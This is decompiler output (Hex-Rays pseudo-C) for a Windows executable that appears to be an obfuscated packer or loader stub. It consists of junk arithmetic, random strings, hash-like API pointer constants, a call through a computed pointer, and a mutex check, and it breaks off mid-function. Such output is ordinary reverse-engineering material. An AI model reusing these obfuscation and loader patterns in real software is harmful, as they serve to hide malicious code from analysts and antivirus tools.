/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int __stdcall sub_401000(int, int, int (__stdcall *)(int, int, _DWORD));
// void __usercall __noreturn start(unsigned int@<eax>, int@<edx>, int@<ecx>, int@<ebx>, int@<edi>, int@<esi>);
DWORD __stdcall sub_401D07(int, int);
// int __userpurge sub_401E92@<eax>(int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int);
void __stdcall sub_4021BA(__int64);
int __stdcall sub_40242F(int, void (__stdcall *)(int, _DWORD, int), int);
int __fastcall sub_4024FA(int, int, int, int, unsigned int);
int __stdcall sub_40275F(int, int, int);
_WORD *sub_402962();
DWORD __stdcall sub_402B1C(int, int, int);
DWORD __stdcall sub_402D4E(int, int);
// int __usercall sub_402E4B@<eax>(int a1@<eax>, unsigned int a2@<edx>, int a3@<ecx>);
_DWORD __stdcall sub_40316E(_DWORD, _DWORD, _DWORD); // weak
int __stdcall sub_40327C(int);
unsigned int __fastcall sub_4038BE(int, int, int);
HANDLE __stdcall sub_403AA7(int);
_BYTE *__cdecl sub_403F42(_BYTE *, _BYTE *);
void sub_404033();
unsigned __int8 __cdecl sub_404205(int, int, _BYTE *, unsigned int);
// int __usercall sub_4045C7@<eax>(int@<esi>);
// int __usercall sub_404658@<eax>(void *@<eax>, int@<edx>, int@<ecx>);
// void __usercall sub_4049BB(char@<cf>, int@<eax>, int@<esi>);
int __stdcall sub_404A06(int, unsigned __int8 *, unsigned int *);
int __cdecl sub_404D91(int, int, _BYTE *);
// void __usercall sub_405341(unsigned int@<ecx>, void *@<edi>, const void *@<esi>);
// int __usercall sub_4056AA@<eax>(int@<esi>);
unsigned int __cdecl sub_405F73(_BYTE *);
// int __usercall sub_406C59@<eax>(int@<eax>, int@<ebx>, int@<ebp>, _DWORD *@<edi>);
unsigned __int8 __cdecl sub_406FE5(_BYTE *, unsigned int, int);
// void __usercall sub_4099F1(bool@<cf>, int _EAX@<eax>, unsigned __int8@<dl>, int@<ecx>, int@<ebx>, int@<edi>, double@<st0>);
// int __usercall sub_40ADA8@<eax>(int@<ebp>, int@<edi>);
void __fastcall __noreturn sub_40C30D(char, int);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_401FFF; // weak
int dword_4071E0[7] =
{
  -172111582,
  -766349601,
  -1465756807,
  -254188464,
  -230083642,
  -1067151879,
  1449717346
}; // weak
char byte_416EA5[3] = { 'Ù', 'v', 'O' }; // weak
_UNKNOWN unk_41E575; // weak
_UNKNOWN unk_4232DD; // weak
_UNKNOWN unk_4233DC; // weak
_UNKNOWN unk_4234DC; // weak
int (__fastcall *dword_443124)(_DWORD, _DWORD, _DWORD, _DWORD) = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD))0xD639CFA4; // weak
int (__fastcall *dword_44312C)(_DWORD, _DWORD, _DWORD) = (int (__fastcall *)(_DWORD, _DWORD, _DWORD))0xC6DAD0A0; // weak
int dword_443144 = 1462642767; // weak
int dword_443148 = 88675123; // weak
_UNKNOWN unk_44314C; // weak
int dword_443160 = 15552; // weak
int (__thiscall *dword_443168)(_DWORD) = (int (__thiscall *)(_DWORD))0xF90844B4; // weak
int dword_44317C = 394436341; // weak
int dword_44318C = -1154513685; // weak
int dword_443190 = 362436069; // weak
int (__fastcall *dword_443194)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))0xD639CFA4; // weak
int (__stdcall *dword_443198)(_DWORD, _DWORD, _DWORD, _DWORD) = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))0x7E0CF868; // weak
__int64 (__thiscall *dword_4431A8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = (__int64 (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))0xDDED5F51; // weak
int dword_4431AC = 521288629; // weak
int dword_4431B4 = 1395490832; // weak
int (__thiscall *dword_4431C8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = (int (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))0x7E0CF868; // weak
int (__thiscall *dword_4431D4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = (int (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))0xD1428F3D; // weak
int dword_4431DC = 394436341; // weak
int dword_4431EC = 1510707790; // weak
int (__stdcall *dword_4431FC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))0xC2550B0E; // weak
int dword_4448CD = 0; // weak
char byte_4448D5 = '\0'; // weak
int dword_4448D9 = 0; // weak
int dword_4448DD = 0; // weak
int dword_4448E1 = 0; // weak
int dword_4448E5 = 0; // weak
int dword_4448E9 = 0; // weak
int dword_4448ED = 0; // weak
int dword_4448F1 = 0; // weak
int dword_4448F5 = 0; // weak
int dword_4448FD = 0; // weak
int dword_444901 = 0; // weak
int dword_444905 = 0; // weak
int dword_44490D = 0; // weak
int dword_444911 = 0; // weak
int dword_444915 = 0; // weak
char byte_4449F1 = '\0'; // weak
int dword_444B41; // weak
int dword_444BD9; // weak
int dword_444C49; // weak
int dword_444DAD; // weak
// extern _UNKNOWN byte_445001; weak
// extern HANDLE (__stdcall *CreateEventA)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
// extern HANDLE (__stdcall *CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern DWORD (__stdcall *GetLastError)();
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern HANDLE (__stdcall *GetStdHandle)(DWORD nStdHandle);
// extern DWORD (__stdcall *GetTickCount)();
// extern BOOL (__stdcall *GetVersionExA)(LPOSVERSIONINFOA lpVersionInformation);
// extern BOOL (__stdcall *QueryPerformanceCounter)(LARGE_INTEGER *lpPerformanceCount);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern _UNKNOWN byte_445152; weak
// extern _UNKNOWN byte_4453D2; weak


//----- (00401000) --------------------------------------------------------
int __stdcall sub_401000(int a1, int a2, int (__stdcall *a3)(int, int, _DWORD))
{
  int v3; // eax
  unsigned int v4; // edx
  int v5; // ecx
  int v7; // [esp+14h] [ebp+8h]

  v3 = sub_402B1C(-178150608, (int)"yxm3yu c2zw3mc3onl3krg.c.1n9.yokbivkempxe0l, z", -178150608);
  dword_44318C = sub_402E4B(v3, v4, v5);
  v7 = a1 - 1;
  if ( v7 )
    return a3(v7, a2, a3);
  else
    return 0;
}
// 40101D: variable 'v4' is possibly undefined
// 40101D: variable 'v5' is possibly undefined
// 44318C: using guessed type int dword_44318C;

//----- (00401042) --------------------------------------------------------
void __usercall __noreturn start(
        unsigned int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<edi>,
        int a6@<esi>)
{
  unsigned int v6; // edx
  int v7; // ett
  unsigned int v8; // eax
  int v9; // ett
  int v10; // edx
  unsigned int v11; // ecx
  unsigned int CurrentProcess; // eax
  unsigned int v13; // ecx
  int v14; // ecx
  int v15; // ecx
  unsigned int v16; // eax
  unsigned int v17; // edx
  int v18; // ecx
  int v19; // ecx
  int v20; // eax
  int v21; // eax
  int v22; // edx
  int v23; // edx
  int v24; // eax
  int v25; // edx
  int v26; // eax
  unsigned int v27; // edx
  bool v28; // cf
  unsigned int v29; // ett
  BOOL v30; // ett
  char v31; // cl
  int v32; // ecx
  int v33; // edx
  int v34; // eax
  int v35; // edx
  int v36; // ecx
  int v37; // eax
  int v38; // ecx
  unsigned int v39; // ett
  int v40; // edx
  int v41; // edx
  int v42; // ecx
  __int64 v43; // rax
  int v44; // ecx
  int v45; // ecx
  int v46; // edx
  unsigned int v47; // ecx
  __int16 v48; // dx
  int v49; // edx
  DWORD v50; // eax
  int v51; // ecx
  unsigned int v52; // edx
  int v53; // ecx
  int v54; // kr10_4
  __int64 v55; // [esp-8h] [ebp-18Ch]
  int v56; // [esp+0h] [ebp-184h]
  int v57; // [esp+4h] [ebp-180h]
  int v58; // [esp+8h] [ebp-17Ch]
  struct _OSVERSIONINFOA VersionInformation; // [esp+Ch] [ebp-178h]
  int v60; // [esp+A0h] [ebp-E4h]
  int v61; // [esp+A4h] [ebp-E0h]
  int kk; // [esp+A8h] [ebp-DCh]
  int jj; // [esp+ACh] [ebp-D8h]
  int *v64; // [esp+B0h] [ebp-D4h]
  int v65; // [esp+B4h] [ebp-D0h]
  int v66; // [esp+B8h] [ebp-CCh] BYREF
  int v67; // [esp+BCh] [ebp-C8h]
  int v68; // [esp+C0h] [ebp-C4h]
  int v69; // [esp+C4h] [ebp-C0h]
  int v70; // [esp+C8h] [ebp-BCh]
  int v71; // [esp+CCh] [ebp-B8h]
  int v72; // [esp+D0h] [ebp-B4h]
  int v73; // [esp+D4h] [ebp-B0h]
  int (__thiscall *v74)(int); // [esp+D8h] [ebp-ACh]
  int v75; // [esp+DCh] [ebp-A8h]
  unsigned int v76; // [esp+F8h] [ebp-8Ch]
  _WORD *v77; // [esp+FCh] [ebp-88h]
  int v78; // [esp+100h] [ebp-84h]
  int v79; // [esp+104h] [ebp-80h]
  int v80; // [esp+108h] [ebp-7Ch]
  int *v81; // [esp+10Ch] [ebp-78h]
  int ii; // [esp+110h] [ebp-74h]
  int v83; // [esp+114h] [ebp-70h]
  int n; // [esp+118h] [ebp-6Ch]
  int m; // [esp+11Ch] [ebp-68h]
  int *v86; // [esp+120h] [ebp-64h]
  int v87; // [esp+124h] [ebp-60h] BYREF
  int v88; // [esp+128h] [ebp-5Ch] BYREF
  int v89; // [esp+12Ch] [ebp-58h]
  int *v90; // [esp+13Ch] [ebp-48h]
  unsigned int *v91; // [esp+140h] [ebp-44h]
  int k; // [esp+144h] [ebp-40h]
  int v93; // [esp+148h] [ebp-3Ch] BYREF
  unsigned int v94; // [esp+14Ch] [ebp-38h] BYREF
  unsigned int v95; // [esp+150h] [ebp-34h]
  int v96; // [esp+154h] [ebp-30h]
  int *v97; // [esp+158h] [ebp-2Ch]
  int j; // [esp+15Ch] [ebp-28h]
  int i; // [esp+164h] [ebp-20h]
  int v100; // [esp+168h] [ebp-1Ch]
  unsigned int v101; // [esp+16Ch] [ebp-18h]
  int v102[2]; // [esp+170h] [ebp-14h] BYREF
  unsigned int v103; // [esp+178h] [ebp-Ch]
  int savedregs; // [esp+184h] [ebp+0h] BYREF

  v103 += a1;
  v6 = v103 + a2;
  if ( a1 >= v103 )
  {
    v103 += (a1 < v103) + 33546;
    a3 = 0;
    if ( v103 <= v6 )
    {
      v7 = ((((v103 ^ 0x640D) - v6) | 0xFCB300000000ui64) + 35515) >> 32;
      v103 = (v103 ^ 0x640D) - v6 + 35515;
      a3 = -v7;
    }
    v103 -= (__CFADD__(__CFADD__(v6, 42153), v6 + 42153) | __CFADD__(__CFADD__(v6, 42153) + v6 + 42153, 132)) + 2827;
    v6 = 0;
    a1 = 0;
  }
  v103 = v103 + 36584 - a1;
  dword_443144 = a4;
  v8 = 0;
  v102[1] = (v6 + 24682) ^ (a3 - v103 + 7 - (v6 + 24682)) ^ ((a3 - v103 + 7 < v6 + 24682)
                                                           + ((v6 + 24682) & (7 - (v6 + 24682)))
                                                           + 1350);
  dword_4431B4 = a6;
  for ( i = 0; i < 4; ++i )
  {
    v102[0] = -244381823;
    v101 = (v8 ^ (((unsigned int)(v100 + 1) > 0xF8B7837B)
                + -122190981
                - ((__PAIR64__(v100, -122190981) + 4172776454u) >> 32)
                + 201))
         + 139;
    v9 = ((v8 | 0xA75C00000000ui64) + 114) >> 32;
    v8 += 114;
    v101 ^= 0x70u;
    v100 = (v100 - v9) ^ 0x369;
  }
  for ( j = 0; j < 3; ++j )
  {
    v102[0] = -138345818;
    v97 = v102;
    v100 = 29;
    v10 = 4456276;
    v101 = -2077474304;
    if ( (((unsigned int)&savedregs - 52403) & 0x43FF54) == 0 )
    {
      LOBYTE(v100) = v100 - 84;
      v100 &= 0x16u;
      v10 = -v101;
    }
    v11 = (unsigned int)&savedregs + v101 - 52403;
    v101 &= v11;
  }
  v102[0] ^= v10;
  v100 += (v11 < v101) + 29106;
  dword_4431EC = a5;
  v96 = 40000;
  v95 = 17348;
  for ( k = 0; k < 1; ++k )
  {
    CurrentProcess = (unsigned int)GetCurrentProcess();
    v93 -= 48071;
    v28 = __CFADD__(CurrentProcess, 34921);
    CurrentProcess += 34921;
    v95 += CurrentProcess + v28;
    v28 = v95 < v13;
    v95 -= v13;
    v14 = v28 + v13 + 80705;
    v95 -= CurrentProcess | 0xFC7A;
  }
  v94 = 211;
  v93 = -32172098;
  v95 *= 132902740;
  v15 = v14 + 50320;
  if ( !v95 )
  {
    v94 += 19909;
    v94 += 10367;
    v94 += v15;
    v95 = 32615;
    v94 ^= 0x4720u;
  }
  v91 = &v94;
  v90 = &v93;
  v16 = (unsigned int)&v93;
  v28 = (unsigned __int64)((int)v94 * (__int64)(int)(v93 + v94)) >> 32 != 0;
  v94 *= v93 + v94;
  v17 = v93 & (unsigned int)&v94;
  if ( v94 >= v94 + v28 + v94 )
  {
    v16 = v17 & (unsigned int)&v93;
    v17 &= v94;
  }
  v95 ^= 0xFu;
  v95 &= v17 | 0x179A;
  v95 -= v16;
  v89 = 0;
  v88 = 255;
  v86 = &v88;
  v87 = -1789342464;
  for ( m = 0; m < 4; ++m )
  {
    GetCurrentProcess();
    if ( v88 == 108 )
    {
      v18 = 0;
      for ( n = 0; n < 5; ++n )
      {
        v87 *= v87 * (v87 | 0xF26E9884);
        v19 = v18 - v88;
        v88 &= v87;
        v20 = 2 * (v87 - v88);
        v87 += (53136 - v19) & 0x1C;
        v83 = 53136 - v19 + 142;
        v21 = v88 ^ (v19 + v20 + __CFADD__(v19, v20) + v19 + v20);
        v87 += 48799;
        v28 = (unsigned __int64)(v88 * (__int64)(v88 + (v87 & v88))) >> 32 != 0;
        v88 *= v88 + (v87 & v88);
        v18 = v88;
        v87 += v21 + v28;
        v22 = 0;
        v88 ^= v21;
        if ( (v21 & v18) == 0 )
        {
          v22 = v83;
          v18 += v83 + 31473;
        }
        v23 = v22 | 0x7B;
      }
      for ( ii = 0; ii < 2; ++ii )
      {
        sub_4024FA(v18, v23, v87, v87, (unsigned int)"l,n2wjby41mli8fyjgexac5qamkmr9 wx0zc.le,co7 ");
        v81 = &v87;
        v88 *= v88 - (v87 | 0x5D60);
        sub_4024FA((int)&v87, v88, v87, v87, (unsigned int)"uqwk4nzo7u7bjbl u0ewodz1qhpm0gj2ynjzpz,bt4o6");
        sub_401E92(
          (int)"d n8u4xeogtdex80akw1o vkxtqibfxc,lx8syxt71",
          v56,
          v57,
          v58,
          VersionInformation.dwOSVersionInfoSize,
          VersionInformation.dwMajorVersion,
          VersionInformation.dwMinorVersion,
          VersionInformation.dwBuildNumber,
          VersionInformation.dwPlatformId,
          *(int *)VersionInformation.szCSDVersion,
          *(int *)&VersionInformation.szCSDVersion[4],
          *(int *)&VersionInformation.szCSDVersion[8],
          *(int *)&VersionInformation.szCSDVersion[12],
          *(int *)&VersionInformation.szCSDVersion[16],
          *(int *)&VersionInformation.szCSDVersion[20],
          *(int *)&VersionInformation.szCSDVersion[24],
          *(int *)&VersionInformation.szCSDVersion[28],
          *(int *)&VersionInformation.szCSDVersion[32],
          *(int *)&VersionInformation.szCSDVersion[36],
          *(int *)&VersionInformation.szCSDVersion[40],
          *(int *)&VersionInformation.szCSDVersion[44],
          *(int *)&VersionInformation.szCSDVersion[48],
          *(int *)&VersionInformation.szCSDVersion[52],
          *(int *)&VersionInformation.szCSDVersion[56],
          *(int *)&VersionInformation.szCSDVersion[60],
          *(int *)&VersionInformation.szCSDVersion[64],
          *(int *)&VersionInformation.szCSDVersion[68],
          *(int *)&VersionInformation.szCSDVersion[72],
          *(int *)&VersionInformation.szCSDVersion[76],
          *(int *)&VersionInformation.szCSDVersion[80],
          *(int *)&VersionInformation.szCSDVersion[84],
          *(int *)&VersionInformation.szCSDVersion[88],
          *(int *)&VersionInformation.szCSDVersion[92],
          *(int *)&VersionInformation.szCSDVersion[96],
          *(int *)&VersionInformation.szCSDVersion[100],
          *(int *)&VersionInformation.szCSDVersion[104],
          *(int *)&VersionInformation.szCSDVersion[108],
          *(int *)&VersionInformation.szCSDVersion[112],
          *(int *)&VersionInformation.szCSDVersion[116],
          *(int *)&VersionInformation.szCSDVersion[120],
          *(int *)&VersionInformation.szCSDVersion[124],
          v60,
          v61,
          kk,
          jj,
          (int)v64,
          v65,
          v66,
          v67,
          v68,
          v69,
          v70,
          v71,
          v72);
      }
    }
  }
  v24 = sub_40242F(10, (void (__stdcall *)(int, _DWORD, int))sub_401000, (int)sub_40316E);
  v79 = -195703937 - v24;
  v80 = v25 - 26010;
  v26 = (__CFADD__(v25, -26010) + v24 + 49678) | 0x397;
  if ( (v25 & 0x80) == 0 )
  {
    v80 |= v26;
    v79 &= v26;
  }
  v80 -= 171;
  v79 |= 0xD8FDu;
  sub_402B1C(v79, v79, v80);
  v89 = sub_40327C(3781856);
  v78 = 26281;
  sub_402B1C(26281, 26281, 26281);
  v77 = sub_402962();
  v75 = -50364;
  v76 = -42580698;
  v28 = v27 + 50424 > 0xE10;
  if ( v27 != -46824 )
  {
    v28 = __CFADD__(v76, 2);
    v76 += 2;
    v76 -= v28 + 3600;
    if ( ((v27 ^ (v27 + 50424)) & 0x7254) != 0 )
      goto LABEL_32;
    v28 = v76 < v27;
    v76 -= v27;
    v29 = v28 + 234;
    v28 = v76 < v29;
    v76 -= v29;
    v30 = v28;
    v28 = __CFADD__(v28, v75) | __CFADD__(v28 + v75, 3600);
    v75 += v30 + 3600;
  }
  v75 -= v28 + 10439;
LABEL_32:
  v75 &= 0x21D6u;
  v76 += 28353;
  v73 = 32344;
  sub_40275F((int)"7l 8d,bshefmdxntyuk3ld6y1h3.fy.xhubwehgnvzu ", 32344, 32344);
  v74 = (int (__thiscall *)(int))((char *)v77 + v89);
  v72 = 224;
  v70 = -152691120;
  v71 = 0;
  HIDWORD(v55) = "kpjqiuhb0z8. d0ia4sxrn1gn0 476vxdsum bgf";
  LODWORD(v55) = 224;
  sub_4021BA(v55);
  v32 = v31 & 0x78;
  v70 -= v32;
  v71 &= v71 + v33;
  v71 |= v32;
  v70 += 34209;
  v34 = v72 / (v72 + 1);
  v35 = v72 % (v72 + 1);
  v71 -= v34;
  v36 = v34 | (v72 + 1);
  v37 = v35 + v34;
  v70 += 169;
  v28 = __CFADD__(v72, v36);
  v38 = v72 + v36;
  v39 = v28 + v38;
  v28 = v72 < v39;
  v72 -= v39;
  v40 = v35 + v28 + v35;
  if ( (v40 & v71) == 0 )
  {
    v71 += v37;
    v38 |= 0x6CAu;
    v71 += 252;
    v71 += v37;
  }
  v71 |= 0xEFCFu;
  v71 += 177;
  v71 ^= v40;
  v71 |= 0x6B0Fu;
  v70 += 24057;
  v71 ^= 0xE9EDu;
  v71 += v37 ^ (v40 + 5563);
  v69 = v74(v38);
  v67 = 20436;
  sub_4021BA(0x4FD400004FD4i64);
  v68 = 131;
  HIDWORD(v55) = v67;
  LODWORD(v55) = v67;
  sub_4021BA(v55);
  LODWORD(v43) = sub_4038BE(v42, v41, v68);
  HIDWORD(v43) = (HIDWORD(v43) - v67) | 0xFD;
  v67 |= v43;
  v67 -= v44;
  v67 |= v44;
  if ( ((unsigned int)v43 & v67) == 0 )
  {
    v67 -= 62596;
    v66 -= 239;
    v66 ^= v43 + 55933 + __CFADD__(v43, 0xC8500000DA7Di64) + v43 + 55933;
  }
  v66 -= 16148;
  v65 = 0;
  while ( 1 )
  {
    v64 = &v66;
    v67 |= 0x84u;
    v45 = 132 - v68;
    v66 = 0;
    v68 = 396;
    v46 = 0;
    for ( jj = 0; jj < 1; ++jj )
    {
      if ( v68 <= 4472 )
      {
        sub_402B1C(v66, v68, v67);
        sub_402B1C(v66, v68, v67);
        sub_401E92(
          v67,
          v56,
          v57,
          v58,
          VersionInformation.dwOSVersionInfoSize,
          VersionInformation.dwMajorVersion,
          VersionInformation.dwMinorVersion,
          VersionInformation.dwBuildNumber,
          VersionInformation.dwPlatformId,
          *(int *)VersionInformation.szCSDVersion,
          *(int *)&VersionInformation.szCSDVersion[4],
          *(int *)&VersionInformation.szCSDVersion[8],
          *(int *)&VersionInformation.szCSDVersion[12],
          *(int *)&VersionInformation.szCSDVersion[16],
          *(int *)&VersionInformation.szCSDVersion[20],
          *(int *)&VersionInformation.szCSDVersion[24],
          *(int *)&VersionInformation.szCSDVersion[28],
          *(int *)&VersionInformation.szCSDVersion[32],
          *(int *)&VersionInformation.szCSDVersion[36],
          *(int *)&VersionInformation.szCSDVersion[40],
          *(int *)&VersionInformation.szCSDVersion[44],
          *(int *)&VersionInformation.szCSDVersion[48],
          *(int *)&VersionInformation.szCSDVersion[52],
          *(int *)&VersionInformation.szCSDVersion[56],
          *(int *)&VersionInformation.szCSDVersion[60],
          *(int *)&VersionInformation.szCSDVersion[64],
          *(int *)&VersionInformation.szCSDVersion[68],
          *(int *)&VersionInformation.szCSDVersion[72],
          *(int *)&VersionInformation.szCSDVersion[76],
          *(int *)&VersionInformation.szCSDVersion[80],
          *(int *)&VersionInformation.szCSDVersion[84],
          *(int *)&VersionInformation.szCSDVersion[88],
          *(int *)&VersionInformation.szCSDVersion[92],
          *(int *)&VersionInformation.szCSDVersion[96],
          *(int *)&VersionInformation.szCSDVersion[100],
          *(int *)&VersionInformation.szCSDVersion[104],
          *(int *)&VersionInformation.szCSDVersion[108],
          *(int *)&VersionInformation.szCSDVersion[112],
          *(int *)&VersionInformation.szCSDVersion[116],
          *(int *)&VersionInformation.szCSDVersion[120],
          *(int *)&VersionInformation.szCSDVersion[124],
          v60,
          v61,
          kk,
          jj,
          (int)v64,
          v65,
          v66,
          v67,
          v68,
          v69,
          v70,
          v71,
          v72);
      }
      sub_4024FA(v45, v46, (int)"p4lijo7frrda,h18wymqx76. 8", v67, v68);
      for ( kk = 0; kk < 4; ++kk )
      {
        GetTickCount();
        v49 = v48 & 0xE68D;
        v66 ^= 0x88CBu;
        if ( (v47 & 0x91) != 0 )
        {
          v66 |= 0xC603u;
          v60 += v49 + (v47 < 0xA03);
        }
        v67 |= v49 - 210;
        v66 *= v66 * (v68 | 0xF7EAE5F2);
        v60 = 53285;
        v50 = sub_402D4E(53285, (int)"m,tb8ao ne 682 u40ejrog n602949dl");
        v54 = v51 - (v28 + 41851) - v66;
        v46 = (__PAIR64__(v52, v51 - ((unsigned int)v28 + 41851)) - ((unsigned int)v66 | 0x7200000000i64)) >> 32;
        v53 = v54;
        v68 ^= v46;
        if ( !v50 )
          v53 = (v54 + 48590) | 0xED28;
        v45 = v53 | 0x1AAF;
      }
    }
    if ( ++v65 >= 5 )
      ExitProcess(0);
  }
}
// 401275: variable 'v13' is possibly undefined
// 40153F: variable 'v18' is possibly undefined
// 40153F: variable 'v23' is possibly undefined
// 4015D2: variable 'v25' is possibly undefined
// 401895: variable 'v27' is possibly undefined
// 401969: variable 'v31' is possibly undefined
// 40196C: variable 'v33' is possibly undefined
// 401A92: variable 'v42' is possibly undefined
// 401A92: variable 'v41' is possibly undefined
// 401A97: variable 'v43' is possibly undefined
// 401AB1: variable 'v44' is possibly undefined
// 401BFE: variable 'v45' is possibly undefined
// 401BFE: variable 'v46' is possibly undefined
// 401C13: variable 'v48' is possibly undefined
// 401C28: variable 'v47' is possibly undefined
// 401C90: variable 'v51' is possibly undefined
// 401C90: variable 'v28' is possibly undefined
// 401C9C: variable 'v52' is possibly undefined
// 40316E: using guessed type _DWORD __stdcall sub_40316E(_DWORD, _DWORD, _DWORD);
// 443144: using guessed type int dword_443144;
// 4431B4: using guessed type int dword_4431B4;
// 4431EC: using guessed type int dword_4431EC;

//----- (00401D07) --------------------------------------------------------
DWORD __stdcall sub_401D07(int a1, int a2)
{
  HANDLE ProcessHeap; // eax
  __int16 v3; // dx
  unsigned int v4; // edx
  int v5; // ecx
  int v6; // ecx
  bool v7; // cf
  unsigned __int64 v8; // kr00_8
  int v9; // edx
  int v10; // eax
  int v11; // ecx
  int v12; // ecx
  int v13; // edx
  int v14; // edx
  int v15; // ecx
  DWORD LastError; // eax
  DWORD v17; // edx
  unsigned int v18; // ecx
  DWORD result; // eax
  int v20; // ecx
  struct _OSVERSIONINFOA VersionInformation; // [esp+0h] [ebp-C4h] BYREF
  int i; // [esp+9Ch] [ebp-28h]
  int v23; // [esp+A0h] [ebp-24h]
  int v24; // [esp+A4h] [ebp-20h]
  int v25; // [esp+A8h] [ebp-1Ch]
  unsigned int v26; // [esp+ACh] [ebp-18h]
  int v27; // [esp+B0h] [ebp-14h]
  unsigned int v28; // [esp+B4h] [ebp-10h]
  int v29; // [esp+B8h] [ebp-Ch]
  int v30; // [esp+BCh] [ebp-8h]
  int v31; // [esp+C0h] [ebp-4h]
  int v32; // [esp+CCh] [ebp+8h]

  GetVersionExA(&VersionInformation);
  ProcessHeap = GetProcessHeap();
  v4 = (v3 & 0xD6EC) - v27;
  v6 = v5 | 0xE343;
  v7 = __CFADD__(v6, v27);
  v27 += v6;
  v32 = a1 - (v7 + 32293);
  if ( (v4 & 0xE5F0) != 0 )
  {
    v4 |= v23;
    v30 += (int)ProcessHeap + 65026;
  }
  v8 = (v4 | 0x8600000000i64) + __PAIR64__(v6, v26);
  v26 += v4;
  v23 += HIDWORD(v8);
  v24 ^= 0xE9u;
  v25 += HIDWORD(v8);
  v24 -= HIDWORD(v8);
  v30 -= 13726;
  GetStdHandle(0xFFFFFFF4);
  GetCurrentThreadId();
  v27 -= v7 + 42;
  if ( (v9 & 0x93) != 0 )
    v32 &= 2 * (v30 + v9);
  for ( i = 0; i < 1; ++i )
  {
    Sleep(4u);
    v12 = v23 & v10 & v11;
    v14 = v13 - v12;
    v15 = v12 | 0x444C;
    if ( v15 >= 0 )
    {
      v27 |= 0x63u;
      v32 = (v15 + v32) ^ 0x3E1B;
      v23 -= v14;
    }
    v32 ^= v14;
    GetTickCount();
  }
  GetProcessHeap();
  v25 = -137298435;
  v27 += v7 + 16;
  v30 -= -8581152 - v31;
  CreateMutexA(0, 0, 0);
  LastError = GetLastError();
  result = LastError - (v7 + v29);
  if ( v18 == v28 )
  {
    result = (__PAIR64__(result, v18) - (v28 | 0xAF00000000i64)) >> 32;
    LOWORD(v25) = v17 | v25;
    v20 = v26 ^ v18;
    v25 &= 0xCA07u;
    if ( v17 <= result )
      result -= v20;
  }
  return result;
}
// 401D23: variable 'v3' is possibly undefined
// 401D36: variable 'v5' is possibly undefined
// 401D8A: variable 'v7' is possibly undefined
// 401D8E: variable 'v9' is possibly undefined
// 401DB3: variable 'v10' is possibly undefined
// 401DB6: variable 'v11' is possibly undefined
// 401DB8: variable 'v13' is possibly undefined
// 401E5D: variable 'v18' is possibly undefined
// 401E64: variable 'v17' is possibly undefined

//----- (00401E92) --------------------------------------------------------
int __userpurge sub_401E92@<eax>(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24,
        int a25,
        int a26,
        int a27,
        int a28,
        int a29,
        int a30,
        int a31,
        int a32,
        int a33,
        int a34,
        int a35,
        int a36,
        int a37,
        int a38,
        int a39,
        int a40,
        int a41,
        int a42,
        int a43,
        int a44,
        int a45,
        int a46,
        int a47,
        int a48,
        int a49,
        int a50,
        int a51,
        int a52,
        int a53,
        int a54)
{
  unsigned int v54; // edx
  int v55; // ecx
  int v56; // eax
  int v57; // eax
  unsigned int v58; // eax
  int v59; // ett
  __int64 v60; // kr08_8
  int v61; // edx
  int v62; // ecx
  int v63; // ecx
  unsigned int v64; // ecx
  int v65; // ecx
  unsigned int v66; // ecx
  int v67; // edx
  int v68; // edx
  bool v69; // cf
  __int64 v70; // rax
  unsigned int v71; // ecx
  int v72; // ecx
  int result; // eax
  unsigned int v74; // eax
  unsigned int v75; // eax
  unsigned int v76; // edx
  struct _OSVERSIONINFOA VersionInformation; // [esp+0h] [ebp-D8h] BYREF
  int *v78; // [esp+94h] [ebp-44h]
  int *v79; // [esp+98h] [ebp-40h]
  int v80; // [esp+9Ch] [ebp-3Ch]
  unsigned int v81; // [esp+A0h] [ebp-38h]
  int v82; // [esp+A4h] [ebp-34h]
  int j; // [esp+A8h] [ebp-30h]
  int *v84; // [esp+ACh] [ebp-2Ch]
  unsigned int v85; // [esp+B0h] [ebp-28h]
  int i; // [esp+B8h] [ebp-20h]
  unsigned int v87; // [esp+BCh] [ebp-1Ch]
  int v88; // [esp+C0h] [ebp-18h] BYREF
  int v89; // [esp+C4h] [ebp-14h]
  int v90; // [esp+C8h] [ebp-10h] BYREF
  unsigned int v91; // [esp+CCh] [ebp-Ch]
  int v92; // [esp+D0h] [ebp-8h] BYREF
